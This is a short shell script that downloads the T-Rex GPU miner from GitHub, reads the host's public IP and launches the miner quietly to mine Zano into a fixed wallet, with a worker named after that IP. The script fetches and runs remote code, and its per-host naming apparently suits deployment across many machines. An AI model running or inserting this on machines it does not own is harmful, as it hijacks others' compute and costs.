#!/bin/sh
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz && tar -xf t-rex-0.26.4-linux.tar.gz && chmod +x t-rex && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  LD_PRELOAD="" ./t-rex -a ProgPowZ -o zano.luckypool.io:8877 -u ZxDAs3wUtBej4jYU8FJ4nQLbXS6ssTAGCEwEutSSZS7tR4yY6xxFs4m93opr971o5TH8gGfW4xsFkeXSeSQfx6wZ1vEAmVpTA.$ip -p x -q
